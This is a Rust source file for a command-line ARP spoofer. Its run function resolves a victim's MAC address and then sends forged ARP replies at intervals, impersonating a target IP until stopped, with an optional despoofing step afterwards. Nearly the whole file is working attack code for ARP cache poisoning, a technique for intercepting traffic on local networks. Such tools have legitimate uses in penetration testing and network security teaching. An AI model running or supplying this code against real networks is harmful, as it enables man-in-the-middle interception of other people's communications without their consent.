//! A simple yet convenient cross-platform ARP spoofer.

mod arp;
pub mod cli;
mod iface;

use arp::{Client, Message};
use cli::Command;

use pnet::packet::arp::ArpOperations;
use std::net::IpAddr;
use std::sync::mpsc;
use std::thread;

pub fn run(cmd: &Command) -> Result<(), &'static str> {
    // Get network interface.
    let iface = cmd
        .iface()
        .map(Clone::clone)
        .or_else(|| iface::get(|iface| !iface.is_loopback() && iface.is_up()))
        .ok_or("No usable network interface found")?;

    // Create ARP Client.
    let mut client = Client::new(&iface).or(Err("Failed to create ARP client"))?;

    // Get source MAC and IP address.
    let src = (
        iface::get_mac_addr(&iface).ok_or("No MAC address found on interface")?,
        match iface::get_ip_addr(&iface, |ip_addr| ip_addr.is_ipv4()) {
            Some(IpAddr::V4(ip_addr)) => ip_addr,
            _ => return Err("No IPv4 address found on interface"),
        },
    );

    // Resolve victim's MAC address.
    println!("Resolving {}...", cmd.victim_ip_addr());

    let victim_mac_addr =
        match client.resolve(src, cmd.victim_ip_addr(), Some(cmd.resolve_timeout())) {
            Ok(Some(mac_addr)) => mac_addr,
            _ => return Err("Failed resolution"),
        };

    println!("Resolved {} to {}", cmd.victim_ip_addr(), victim_mac_addr);

    // Set handler for SIGINT, SIGTERM and SIGHUP.
    let (tx, rx) = mpsc::channel();
    ctrlc::set_handler(move || tx.send(()).unwrap())
        .or(Err("Failed to set handler for SIGINT, SIGTERM and SIGHUP"))?;

    // Spoof at an interval for however many times.
    println!(
        "Spoofing as {} for {}...",
        cmd.target_ip_addr(),
        cmd.victim_ip_addr()
    );

    let spoof = Message::new(
        (src.0, cmd.target_ip_addr()),
        (victim_mac_addr, cmd.victim_ip_addr()),
        ArpOperations::Reply,
    );

    while let Err(_) = rx.try_recv() {
        client.send(spoof).or(Err("Failed to spoof"))?;

        thread::sleep(cmd.spoof_interval());
    }

    println!(
        "Stopped spoofing as {} for {}",
        cmd.target_ip_addr(),
        cmd.victim_ip_addr()
    );

    // If desired, cleanup.
    if cmd.should_despoof() {
        println!("Despoofing...");

        // Resolve target's MAC address.
        let target_mac_addr =
            match client.resolve(src, cmd.target_ip_addr(), Some(cmd.resolve_timeout())) {
                Ok(Some(mac_addr)) => mac_addr,
                _ => return Err("Failed resolution"),
            };

        // Create reply for cleaning up the effect of spoofing.
        let despoof = Message::new(
            src,
            (target_mac_addr, cmd.target_ip_addr()),
            ArpOperations::Reply,
        );

        client.send(despoof).or(Err("Failed to despoof"))?;

        println!("Despoofed");
    }

    Ok(())
}
